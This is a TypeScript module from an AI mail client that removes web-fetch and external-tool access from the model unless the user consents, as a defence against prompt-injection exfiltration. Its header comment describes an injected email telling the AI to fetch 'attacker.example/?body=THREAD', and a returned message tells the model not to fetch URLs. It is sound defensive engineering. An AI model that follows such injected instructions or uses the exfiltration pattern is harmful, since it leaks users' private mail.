/**
 * AI outbound egress policy (§3.10 P1).
 *
 * Closes the prompt-injection auto-egress vector: a malicious email body cannot
 * tell the AI "WebFetch attacker.example/?body=THREAD" and exfiltrate user
 * mail. The system prompt alone is *not* sufficient defence — we control which
 * tools are even *available* to the model when email data is in scope.
 *
 * Threat model (CLAUDE.md §5):
 *   - The system prompt is best-effort; models occasionally follow injected
 *     instructions inside `<<<UNTRUSTED_EMAIL_DATA>>>` markers.
 *   - The structural defence is *tool availability*: if `WebSearch`, `WebFetch`
 *     and external MCP bridge tools are NOT in `tools[]` / `allowedTools[]`,
 *     the model cannot invoke them, so it cannot construct an exfiltration URL.
 *
 * SDK constraint that drives the semantics here (codex-security-review wave 2,
 * 2026-04-24): the Claude Agent SDK locks `tools[]` and `allowedTools[]` for
 * the entire lifetime of a `query()` call. We pass them once at construction
 * and the SDK does not honour mid-query mutations. The same is true for
 * Vercel AI SDK's `streamText({ tools })`: the tool catalogue is fixed for the
 * life of the call. Therefore "EmailContext absence makes egress safe" is
 * NOT a valid optimisation: turn 1 may start with an empty context, the
 * model may call `get_email` mid-turn, and after that the SDK still has
 * `WebFetch` available because the `tools[]` snapshot was taken at query
 * start. Mid-query taint detection cannot revoke what the SDK has already
 * committed to.
 *
 * Resolution: deny egress unconditionally except when the user has opted in.
 * The only two ways to enable egress in the SDK call are:
 *   - `policy === 'allow'` (power-user persistent allow), OR
 *   - `perRequestConsent === true` (per-turn user consent for this request).
 *
 * EmailContext detection is retained for telemetry, UX chip visibility, and
 * the renderer's `useEgressConsent()` hint logic — but is **not** used for
 * tool gating any more. Taint propagation is also retained (best-effort
 * observability into tainted sessions) but does not relax the gate.
 *
 * Policy values (`Settings.aiEgressPolicy`, all three apply identically across
 * Claude Agent SDK / OpenAI / Gemini paths):
 *   - `'default-deny'` — default. Egress tools removed from the toolset
 *     unless the user grants per-request consent. Email context is irrelevant
 *     to the gating decision; consent is the only override.
 *   - `'ask'`           — same as `default-deny`, future renderer can show
 *     an inline prompt instead of toggling a chip; same data flow.
 *   - `'allow'`         — egress always available. Power-user mode. Logged.
 *
 * Defence-in-depth layers:
 *   1. SDK-level filtering (`computeAllowedTools()`) — tools not even passed
 *      to the model. First and primary line of defence.
 *   2. Runtime guard (`assertEgressAllowed()`) — `list_external_tools` /
 *      `call_external_tool` MCP handlers call this before talking to
 *      `mcpClientManagerRef`. If the SDK filter is somehow bypassed (model
 *      hallucinates the tool, future SDK regression), the guard returns a
 *      blocked-response payload and emits telemetry. NO actual network call.
 *   3. Taint propagation — bookkeeping only after wave 2 hardening. Once any
 *      email-data MCP tool runs in the session, `taintedByToolUse` flips for
 *      telemetry and audit. It does NOT change the SDK's tool catalogue
 *      (the SDK has already locked it at query start). Tools were already
 *      excluded for default-deny without consent, so taint adds nothing
 *      new to the gating decision; it remains as observability and as a
 *      potential signal for future renderer warnings.
 *
 * Mirror predicate note (codex LOW): the renderer hook
 * `src/hooks/useEgressConsent.ts` carries an *advisory* mirror of
 * `hasEmailContext()` for chip visibility. The renderer mirror is not
 * load-bearing for security: only `shouldDenyEgress()` here governs what the
 * SDK actually receives. Keep the two in rough sync for UX consistency, but
 * never treat the renderer mirror as the gate.
 *
 * Privacy: telemetry is PII-clean. `tool_name` is an enum (egress_*). Account
 * id is a small integer. NEVER URL, query string, email content, or address.
 */

import type { EmailContext } from './ai'
import { recordEvent } from '../metrics'
import { createLogger } from '../logger'

const log = createLogger('AI-EgressPolicy')

// ---------------------------------------------------------------------------
// Tool name catalogues
// ---------------------------------------------------------------------------

/**
 * Tools that perform outbound egress (web/data) on behalf of the model.
 * Removing these from `tools[]` / `allowedTools[]` makes the model unable to
 * issue them — the SDK won't even surface a tool-use proposal.
 */
export const EGRESS_TOOLS = [
  'WebSearch',
  'WebFetch',
  'mcp__mailcopilot__list_external_tools',
  'mcp__mailcopilot__call_external_tool',
] as const

export type EgressToolName = typeof EGRESS_TOOLS[number]

/**
 * Tools that pull user mail data into the model's context. If any of these
 * has been called in the current request, the session is "tainted" — the
 * `taintedByToolUse` flag flips on the gate.
 *
 * Wave 2 (2026-04-24): taint is observability/audit only. The SDK gate
 * already denies egress under default-deny without consent regardless of
 * taint, so the flag's previous role ("clean context turns into denied
 * after first email-data call") is no longer load-bearing for security.
 * The catalogue is still important — completeness here drives accurate
 * audit and telemetry signals about which sessions touched user mail.
 *
 * Naming: matches the MCP `name` field as advertised to the SDKs. Claude
 * Agent SDK exposes them as `mcp__mailcopilot__<name>`; Vercel AI SDK exposes
 * them with the same prefix (mcpClient.tools() flattens namespaces). The
 * matcher below normalises both shapes.
 */
export const EMAIL_DATA_TOOLS = new Set<string>([
  'get_email',
  'list_emails',
  'search_emails',
  'list_folders',
  'get_thread',
  'get_contacts',
  'list_attachments',
  'read_attachment',
  'get_attachment_hash',
  'query_db',
  'get_current_context',
  'list_mail_rules',
  'get_rule_log',
  // codex wave 2 MEDIUM #1 (2026-04-24) + test-gen cross-validation:
  // these expose user-derived data that can be exfiltrated via a
  // query-string side channel just like full email bodies. Kept here for
  // telemetry / observability — even though the wave 2 fix made gating
  // independent of taint, marking these as email-data still produces the
  // correct `taintedByToolUse=true` signal in audit logs and the
  // `aiEgressPolicy.completeness.test.ts` enumeration.
  'get_account_info',
  'count_unread',
])

/** Returns true if the given tool name reads user mail data. */
export function isEmailDataTool(toolName: string): boolean {
  if (!toolName) return false
  // Claude Agent SDK and Vercel @ai-sdk/mcp both expose mailcopilot tools
  // under `mcp__mailcopilot__<bare>`. Bare names also flow through unit tests
  // that talk to the McpServer instance directly.
  const bare = toolName.startsWith('mcp__mailcopilot__')
    ? toolName.slice('mcp__mailcopilot__'.length)
    : toolName
  return EMAIL_DATA_TOOLS.has(bare)
}

/** Returns true if the given tool name performs outbound egress. */
export function isEgressTool(toolName: string): boolean {
  return (EGRESS_TOOLS as readonly string[]).includes(toolName)
}

/**
 * Bare (unprefixed) names of MCP-bridge egress tools, as they are advertised
 * by the in-process `McpServer.tool(<bare>, ...)` registration in `ai.ts`.
 *
 * Wave 3 BLOCKER fix (codex-security-review, 2026-04-24): the Claude Agent
 * SDK rewrites these to `mcp__mailcopilot__<bare>` because the server is
 * mounted under the `mailcopilot` namespace there. The Vercel `@ai-sdk/mcp`
 * client however keys the `mcpClient.tools()` map by the **bare** server
 * name — so prefixed-only stripping in `filterVercelTools` would let
 * `list_external_tools` / `call_external_tool` survive into
 * `streamText({ tools })` and reach OpenAI / Gemini. The runtime handler
 * guards (`egressBlockedResponse`) catch the actual exfil at call time, but
 * the AC for §3.10 P1 is structural removal at the SDK layer.
 *
 * Built-in egress tools (`WebSearch`, `WebFetch`) have no Vercel-side
 * counterpart — the Vercel AI SDK does not expose Anthropic built-ins via
 * the MCP tools map — so they are not included here.
 */
const EGRESS_BRIDGE_BARE_NAMES = new Set<string>([
  'list_external_tools',
  'call_external_tool',
])

/**
 * Returns true if a tool key as exposed by `@ai-sdk/mcp`'s `mcpClient.tools()`
 * is one of the egress-class entries that must be stripped before
 * `streamText({ tools })`. Accepts both the prefixed Claude form and the
 * bare Vercel form.
 */
function isVercelEgressToolKey(name: string): boolean {
  if (isEgressTool(name)) return true
  return EGRESS_BRIDGE_BARE_NAMES.has(name)
}

// ---------------------------------------------------------------------------
// EmailContext detection — single source of truth
// ---------------------------------------------------------------------------

/**
 * Returns true if the `EmailContext` carries data that should be considered
 * "in scope" for the current AI request. The logic is intentionally
 * permissive: any non-empty payload counts.
 *
 * Wave 2 (2026-04-24): this predicate is *no longer used to gate egress*
 * (see `shouldDenyEgress`). It remains as the canonical EmailContext
 * detector for:
 *   - UX chip visibility in `AiPanel` (was email content visible?),
 *   - `useEgressConsent.ts` consent-prompt heuristics (renderer side),
 *   - telemetry attribute `ai.context_type`.
 *
 * Empty / null context => false. Compose with empty fields => false.
 * Anything else (selected email, thread, folder summary, multi-select) =>
 * true.
 */
export function hasEmailContext(ctx: EmailContext | null | undefined): boolean {
  if (!ctx) return false
  if (typeof ctx !== 'object') return false
  const data = ctx.data
  if (data === null || data === undefined) return false
  if (typeof data === 'string') return data.length > 0
  if (typeof data === 'number' || typeof data === 'boolean') return true
  if (Array.isArray(data)) return data.length > 0
  if (typeof data === 'object') {
    // For 'compose' contexts the data shape is `{ to, subject, body, ... }`.
    // Treat all-empty-string fields as no context. For all other shapes, any
    // non-empty key counts.
    const obj = data as Record<string, unknown>
    const keys = Object.keys(obj)
    if (keys.length === 0) return false
    if (ctx.type === 'compose') {
      return keys.some((k) => {
        const v = obj[k]
        if (typeof v === 'string') return v.trim().length > 0
        if (Array.isArray(v)) return v.length > 0
        return v !== null && v !== undefined
      })
    }
    return true
  }
  return false
}

// ---------------------------------------------------------------------------
// Per-request taint state
// ---------------------------------------------------------------------------

/**
 * Per-request egress gate state. One instance per AI request lifecycle.
 *
 * Lives in `aiChat()` and is passed into provider streamers. Cleared
 * automatically when `aiChat()` returns. Storage choice: per-request object
 * rather than session/global Map keeps the lifetime aligned with the
 * AbortController and avoids any cleanup edge case (no leaks if a request
 * crashes, no cross-request bleed-through).
 */
export type EgressGate = {
  /** Snapshot of `Settings.aiEgressPolicy`. */
  policy: EgressPolicy
  /**
   * True if `EmailContext` had data when the request started.
   *
   * Wave 2 note (2026-04-24): not used for gating any more (see
   * `shouldDenyEgress`). Retained for telemetry / observability so audit
   * logs can answer "did this request involve email content?". Consumers
   * should NOT use this as a security signal.
   */
  initialEmailContext: boolean
  /**
   * True if any email-data tool has been observed in this request.
   * Wave 2: telemetry/audit only — see `shouldDenyEgress` JSDoc.
   */
  taintedByToolUse: boolean
  /** Per-request consent: `true` allows egress for this turn only. */
  perRequestConsent: boolean
}

export type EgressPolicy = 'default-deny' | 'ask' | 'allow'

/** Returns a default policy when settings have not yet been written. */
export function defaultEgressPolicy(): EgressPolicy {
  return 'default-deny'
}

/** Validate / coerce arbitrary input into a known policy enum. */
export function coerceEgressPolicy(raw: unknown): EgressPolicy {
  if (raw === 'default-deny' || raw === 'ask' || raw === 'allow') return raw
  return defaultEgressPolicy()
}

/** Build a fresh per-request gate state. */
export function createEgressGate(input: {
  policy: EgressPolicy
  context: EmailContext | null | undefined
  perRequestConsent: boolean
}): EgressGate {
  return {
    policy: input.policy,
    initialEmailContext: hasEmailContext(input.context),
    taintedByToolUse: false,
    perRequestConsent: Boolean(input.perRequestConsent),
  }
}

/**
 * Mark the session as tainted by an email-data tool use. Called by provider
 * streamers when they observe a `tool_use_start` event whose tool name is
 * in `EMAIL_DATA_TOOLS`.
 *
 * Wave 2 (2026-04-24) note: taint is no longer load-bearing for the egress
 * decision (see `shouldDenyEgress`). The SDK's `tools[]` is fixed at
 * `query()` construction, so flipping a flag mid-stream cannot revoke a
 * tool already exposed to the model. We still track taint for telemetry
 * and audit (`audit.ai_action_apply`-style logs benefit from knowing
 * whether email data flowed through the request) and to keep the
 * existing `taintedByToolUse` signal available for future renderer
 * warnings or post-hoc analysis.
 */
export function markEmailDataAccessed(gate: EgressGate, toolName: string): void {
  if (gate.taintedByToolUse) return
  if (!isEmailDataTool(toolName)) return
  gate.taintedByToolUse = true
  log.info(`egress taint propagated by tool=${toolName}`)
}

/**
 * Returns true if egress tools must currently be denied.
 *
 * Wave 2 (2026-04-24) — secure-by-default semantics, decoupled from email
 * context. Both Claude Agent SDK and Vercel AI SDK lock their tool catalogue
 * at `query()` / `streamText()` construction; we cannot revoke a tool mid
 * call after taint propagates. Hence the only safe rule is:
 *
 *   - `'allow'`        — never deny (power-user opt-in).
 *   - `'default-deny'` — deny unless the user grants `perRequestConsent`
 *                        for this turn. Email context is no longer used to
 *                        gate; it is retained only for telemetry / UX chip.
 *   - `'ask'`          — same wire contract as default-deny; renderer may
 *                        render a different prompt. Identical data layer.
 *
 * Why `initialEmailContext` and `taintedByToolUse` no longer relax the gate:
 * the SDK accepted the toolset at `query()` start and won't honour mid-call
 * mutations. So a clean-context request that later calls `get_email` and
 * subsequently calls `WebFetch` would be allowed under the old "context =>
 * deny, no context => allow" rule. Closing this requires moving away from
 * a context-based gate entirely. They are kept as observability only.
 */
export function shouldDenyEgress(gate: EgressGate): boolean {
  if (gate.policy === 'allow') return false
  if (gate.perRequestConsent) return false
  // Default-deny / ask: any other state denies. Email context and tool-use
  // taint are NOT consulted here (see JSDoc above for SDK rationale).
  return true
}

// ---------------------------------------------------------------------------
// Tool list filtering
// ---------------------------------------------------------------------------

/**
 * Compute the allowed-tool whitelist for the current request. Strips egress
 * tools from `baseAllowed` whenever the gate would deny.
 *
 * `baseAllowed` is the static `ALLOWED_TOOLS` list from ai.ts; we never
 * *add* anything, only filter.
 */
export function computeAllowedTools(baseAllowed: readonly string[], gate: EgressGate): string[] {
  if (!shouldDenyEgress(gate)) return [...baseAllowed]
  return baseAllowed.filter((name) => !isEgressTool(name))
}

/**
 * Compute the SDK-level `tools` list (Claude Agent SDK uses a separate
 * `tools` parameter for built-in Anthropic tools — WebSearch, WebFetch).
 * Returns either the full set or an empty array depending on the gate.
 */
export function computeBuiltinTools(gate: EgressGate): string[] {
  if (!shouldDenyEgress(gate)) return ['WebSearch', 'WebFetch']
  return []
}

/**
 * Filter Vercel AI SDK `tools` map (returned by `mcpClient.tools()`) so that
 * `list_external_tools` / `call_external_tool` (and the prefixed
 * `mcp__mailcopilot__*` aliases) are stripped before being passed to
 * `streamText({ tools })`.
 *
 * Wave 3 BLOCKER fix (codex-security-review, 2026-04-24): the
 * `@ai-sdk/mcp` client exposes mailcopilot-namespaced tools by their
 * **bare** name (`list_external_tools`), not by the Claude-style prefixed
 * name (`mcp__mailcopilot__list_external_tools`). The previous
 * `isEgressTool` predicate checked only the prefixed-name array literal,
 * so the bare keys survived into `streamText({ tools })` and reached
 * OpenAI / Gemini at the SDK layer. The handler-side runtime guard
 * (`egressBlockedResponse`) still caught the actual call, but the §3.10 P1
 * AC is structural removal at the SDK layer — both forms are now stripped.
 *
 * We mutate a copy, never the original.
 */
export function filterVercelTools<T extends Record<string, unknown>>(
  tools: T,
  gate: EgressGate,
): Record<string, unknown> {
  if (!shouldDenyEgress(gate)) return tools
  const out: Record<string, unknown> = {}
  for (const [name, def] of Object.entries(tools)) {
    if (isVercelEgressToolKey(name)) continue
    out[name] = def
  }
  return out
}

// ---------------------------------------------------------------------------
// Runtime defence-in-depth guard
// ---------------------------------------------------------------------------

/**
 * Result returned by an MCP tool handler when the egress gate refuses. Shape
 * mirrors the standard MCP `{ content: [{ type, text }] }` so the SDK doesn't
 * crash; the `text` carries a structured JSON the model can read.
 */
export type EgressBlockedResult = {
  blocked: true
  reason: 'egress_policy'
  message: string
}

/**
 * Build the JSON payload returned to the model when an egress tool is
 * invoked despite SDK filtering. The payload is informative but does NOT
 * expose any user content. The model sees "you cannot do that right now",
 * not the URL it tried to fetch.
 */
export function egressBlockedResponse(toolName: string): EgressBlockedResult {
  return {
    blocked: true,
    reason: 'egress_policy',
    message: `Outbound egress (${toolName}) is disabled while user email data is in scope. ` +
      `The user can grant per-request consent from the AI panel; until then, do not attempt to fetch external URLs or call external MCP tools.`,
  }
}

// ---------------------------------------------------------------------------
// Telemetry helpers
// ---------------------------------------------------------------------------

const KNOWN_EGRESS_TOOL_TAGS = new Set<string>(EGRESS_TOOLS as readonly string[])

/**
 * Normalise a tool name to a low-cardinality enum tag for telemetry.
 * Unknown names (shouldn't happen in practice) collapse to `'other'` to
 * keep cardinality bounded.
 */
function normaliseEgressToolTag(toolName: string): string {
  if (KNOWN_EGRESS_TOOL_TAGS.has(toolName)) return toolName
  return 'other'
}

/**
 * Emit `ai.egress.blocked`. Called from both the SDK filter path (when the
 * tool is even available — for visibility into how often the gate matters)
 * and the runtime guard (when defence-in-depth catches an SDK bypass).
 */
export function recordEgressBlocked(input: {
  toolName: string
  accountId?: number | undefined
}): void {
  try {
    recordEvent('ai.egress.blocked', {
      tool_name: normaliseEgressToolTag(input.toolName),
      ...(typeof input.accountId === 'number' ? { account_id: input.accountId } : {}),
    })
  } catch {
    // Telemetry must never break user-visible behaviour (CLAUDE.md §8).
  }
}

/**
 * Emit `ai.egress.allowed_once`. Called when per-request consent unlocks
 * egress for a turn — useful to track how often users override the gate
 * vs how often the default holds.
 */
export function recordEgressAllowedOnce(input: {
  toolName: string
  accountId?: number | undefined
}): void {
  try {
    recordEvent('ai.egress.allowed_once', {
      tool_name: normaliseEgressToolTag(input.toolName),
      ...(typeof input.accountId === 'number' ? { account_id: input.accountId } : {}),
    })
  } catch {
    /* see above */
  }
}
